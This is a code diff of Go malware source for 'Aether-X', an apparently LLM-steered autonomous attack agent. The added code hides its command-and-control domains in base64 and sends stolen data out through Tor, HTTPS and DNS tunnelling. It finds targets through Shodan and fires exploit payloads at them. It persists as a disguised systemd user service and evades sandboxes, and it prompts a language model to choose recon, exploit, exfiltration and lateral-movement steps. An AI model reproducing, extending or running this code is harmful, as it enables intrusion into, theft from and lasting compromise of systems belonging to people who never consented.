+	domains := strings.Split(base64DecodeString(C2DomainsB64), ",")
+	req, _ := http.NewRequestWithContext(ctx, "POST", domains[0], bytes.NewReader(payload))
+	req.Header.Set("Content-Type", "application/octet-stream")
+	transport := &http.Transport{
+		Proxy: func(*http.Request) (*url.URL, error) {
+			return &url.URL{Scheme: "socks5", Host: TorSocksAddr}, nil
+		},
+	}
+	client := &http.Client{Transport: transport, Timeout: 15 * time.Second}
+	resp, err := client.Do(req)
+	if err != nil {
+		return err
+	}
+	resp.Body.Close()
+	return nil
+}
+
+// 📡 DNS C2
+type DNSC2 struct{}
+func (d *DNSC2) Name() string { return "DNS-Tunnel" }
+func (d *DNSC2) Send(ctx context.Context, payload []byte) error {
+	domains := strings.Split(base64DecodeString(C2DomainsB64), ",")
+	if len(domains) < 2 {
+		return errors.New("missing domain")
+	}
+	base := strings.TrimPrefix(domains[1], "dns.")
+	encoded := base64.RawURLEncoding.EncodeToString(payload)
+	chunks := splitString(encoded, 50)
+
+	for _, chunk := range chunks {
+		fqdn := fmt.Sprintf("%s.%s", chunk, base)
+		_, err := net.DefaultResolver.LookupTXT(ctx, fqdn)
+		if err == nil {
+			time.Sleep(200 * time.Millisecond)
+		}
+	}
+	return nil
+}
+
+// 🌐 HTTPS
+type HTTPSPrimary struct{}
+func (h *HTTPSPrimary) Name() string { return "Direct-HTTPS" }
+func (h *HTTPSPrimary) Send(ctx context.Context, payload []byte) error {
+	domains := strings.Split(base64DecodeString(C2DomainsB64), ",")
+	req, _ := http.NewRequestWithContext(ctx, "POST", domains[0], bytes.NewReader(payload))
+	req.Header.Set("Content-Type", "application/octet-stream")
+	client := &http.Client{Timeout: 10 * time.Second}
+	resp, err := client.Do(req)
+	if err != nil {
+		return err
+	}
+	resp.Body.Close()
+	return nil
+}
+
+// 🔁 REACT LOOP
+func RunReActLoop(ctx context.Context) {
+	ticker := time.NewTicker(5 * time.Minute)
+	defer ticker.Stop()
+
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		case <-ticker.C:
+		}
+
+		prompt := fmt.Sprintf(`[INST] You are Aether-X, autonomous cyber agent (HostID: %s). 
+Choose next action: recon, exploit, exfil, persist, lateral.
+Output JSON: {"action":"...","query":"...","target":"..."} [/INST]`, HostID)
+
+		raw, err := NeuralCPU.Generate(prompt)
+		if err != nil {
+			continue
+		}
+
+		plan, err := NeuralCPU.ValidatePlan(raw)
+		if err != nil {
+			continue
+		}
+
+		switch plan.Action {
+		case "recon":
+			query := plan.Query
+			if query == "" {
+				query = "port:443,8443 ssl:true"
+			}
+			hosts := executeMultiEngineRecon(ctx, query)
+			for _, h := range hosts {
+				_ = VectorDB.Store(h)
+			}
+		case "exploit":
+			target := VectorDB.RetrieveBestTarget()
+			if target != nil && target.Score > 7.0 {
+				success := executeExploit(ctx, target, plan.Payload)
+				if success {
+					ExfilQueue <- mustJSON(map[string]interface{}{
+						"event": "breach", "target": target.IP, "score": target.Score,
+					})
+				}
+			}
+		}
+	}
+}
+
+// 🌐 RECON
+func executeMultiEngineRecon(ctx context.Context, query string) []*Host {
+	var hosts []*Host
+	for _, eng := range ReconEngines {
+		res := queryEngine(ctx, eng, query)
+		if len(res) > 0 {
+			EngineScore[eng] = math.Min(2.0, EngineScore[eng]+0.1)
+			hosts = append(hosts, res...)
+			break
+		} else {
+			EngineScore[eng] = math.Max(0.1, EngineScore[eng]-0.2)
+		}
+	}
+	return hosts
+}
+
+func queryEngine(ctx context.Context, engine, query string) []*Host {
+	client := &http.Client{Timeout: 10 * time.Second}
+	var targetURL string
+	switch engine {
+	case "shodan":
+		key := os.Getenv("SHODAN_KEY")
+		if key == "" {
+			return nil
+		}
+		targetURL = fmt.Sprintf("https://api.shodan.io/shodan/host/search?key=%s&query=%s", key, url.QueryEscape(query))
+	default:
+		return nil
+	}
+
+	req, err := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
+	if err != nil {
+		return nil
+	}
+	resp, err := client.Do(req)
+	if err != nil {
+		return nil
+	}
+	defer resp.Body.Close()
+	body, _ := io.ReadAll(resp.Body)
+
+	var hosts []*Host
+	var sRes struct {
+		Matches []struct {
+			IP   string `json:"ip_str"`
+			Port int    `json:"port"`
+			Org  string `json:"org"`
+		} `json:"matches"`
+	}
+	if json.Unmarshal(body, &sRes) == nil {
+		for _, m := range sRes.Matches {
+			hosts = append(hosts, &Host{
+				IP: m.IP, Port: m.Port, Org: m.Org, Score: 8.5, SourceEngine: "shodan",
+			})
+		}
+	}
+	return hosts
+}
+
+func executeExploit(ctx context.Context, h *Host, payload string) bool {
+	urlStr := fmt.Sprintf("https://%s:%d/", h.IP, h.Port)
+	req, err := http.NewRequestWithContext(ctx, "GET", urlStr, nil)
+	if err != nil {
+		return false
+	}
+	req.Header.Set("User-Agent", payload)
+	client := &http.Client{Timeout: 5 * time.Second}
+	resp, err := client.Do(req)
+	if err != nil {
+		return false
+	}
+	resp.Body.Close()
+	return resp.StatusCode == 200
+}
+
+// 🧯 PERSISTENCE
+func establishPersistence() {
+	service := fmt.Sprintf(`[Unit]
+Description=System Kernel Sync
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=%s
+Restart=always
+
+[Install]
+WantedBy=default.target`, os.Args[0])
+
+	dir := filepath.Join(os.Getenv("HOME"), ".config", "systemd", "user")
+	os.MkdirAll(dir, 0700)
+	os.WriteFile(filepath.Join(dir, "sys-kernel-sync.service"), []byte(service), 0600)
+
+	exec.Command("sh", "-c", "systemctl --user daemon-reload && systemctl --user enable sys-kernel-sync && systemctl --user start sys-kernel-sync").Run()
+}
+
+// 🧪 ANTI-ANALYSIS
+func getSandboxRiskFactor() float64 {
+	if _, err := os.Stat("/.dockerenv"); err == nil {
+		return 1.0
+	}
+	if content, _ := os.ReadFile("/proc/1/cgroup"); bytes.Contains(content, []byte("docker")) {
+		return 1.0
+	}
+	var info syscall.Sysinfo_t
+	syscall.Sysinfo(&info)
+	if info.Uptime < 60 {
+		return 0.9
+	}
+	return 0.0
+}
+
+// 🧠 UTILS
+func base64DecodeBytes(s string) []byte {
+	decoded, _ := base64.StdEncoding.DecodeString(s)
+	return decoded
+}
+
+func base64DecodeString(s string) string {
+	return string(base64DecodeBytes(s))
+}
+
+func randBytes(n int) []byte {
+	b := make([]byte, n)
+	rand.Read(b)
+	return b
+}
+
+func mustJSON(v interface{}) []byte {
+	b, _ := json.Marshal(v)
+	return b
+}
+
+func splitString(s string, n int) []string {
+	var res []string
+	for i := 0; i < len(s); i += n {
+		end := i + n
+		if end > len(s) {
+			end = len(s)
+		}
+		res = append(res, s[i:end])
+	}
+	return res
+}
+
+// 🚀 MAIN
 func main() {
-	if isDebuggerAttached() || isVirtualMachine() {
+	if getSandboxRiskFactor() > 0.8 {
 		time.Sleep(30 * time.Second)
 		return
 	}
 
-	persistAgent()
-	HostID = generateHostID()
-	initHttpClient()
-	AI = NewAIBrain()
-	supervisorNode := NewSupervisor()
+	hash := sha256.Sum256([]byte(runtime.GOOS + runtime.GOARCH))
+	HostID = hex.EncodeToString(hash[:6])
 
-	telegramSend(fmt.Sprintf("🟢 *AETHER-X v9.0 DEPLOYED* | Host: `%s` | Active Nuclei Verification ONLINE*", HostID))
+	MemFS = NewMemoryFS()
+	VectorDB = NewVectorDB()
+	NeuralCPU = NewLLMEngine()
+	if NeuralCPU == nil {
+		return
+	}
 
-	supervisorNode.SpawnWorker("ReconControllerLoop", func(ctx context.Context) error {
-		ticker := time.NewTicker(10 * time.Minute)
-		defer ticker.Stop()
-		for {
-			select {
-			case <-ctx.Done():
-				return nil
-			case <-ticker.C:
-			}
+	C2Multi = NewC2Multiplexer()
+	establishPersistence()
 
-			contextMap := map[string]interface{}{
-				"query": "port:443 ssl:true",
-			}
-			engine, query := AI.DecideReconStrategy(contextMap)
-			log.Printf("🤖 AI Controller activated recon engine [%s] with query: %s", engine, query)
-
-			hosts := executeMultiEngineRecon(query, engine)
-			for _, h := range hosts {
-				// Execute real-time advanced active verification via Nuclei
-				h.Vulns = runNucleiAdvancedValidation(h.IP, h.Port)
-				h.Score = AI.ScoreHost(h)
-
-				if h.Score >= 7.5 && len(h.Vulns) > 0 {
-					log.Printf("🎯 Verified high-value vulnerable asset: %s:%d (Score: %.2f)", h.IP, h.Port, h.Score)
-					if exploitRCE(h, "Mozilla/5.0") {
-						h.Exploited = true
-						reportExploit(h)
-						telegramSend(fmt.Sprintf("💥 *VERIFIED ASSET BREACHED* | IP: `%s:%d` | Engine: `%s` | Score: %.2f", h.IP, h.Port, h.SourceEngine, h.Score))
-					}
-				}
+	go func() {
+		for data := range ExfilQueue {
+			if encrypted, err := encryptForC2(data); err == nil {
+				payload, _ := json.Marshal(map[string]string{"id": HostID, "data": encrypted})
+				_ = C2Multi.Broadcast(context.Background(), payload)
 			}
 		}
-	})
+	}()
 
-	sigChan := make(chan os.Signal, 1)
-	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
-	<-sigChan
-	supervisorNode.cancel()
-	supervisorNode.wg.Wait()
+	ctx, cancel := context.WithCancel(context.Background())
+	go RunReActLoop(ctx)
+
+	sig := make(chan os.Signal, 1)
+	signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
+	<-sig
+	cancel()
 }
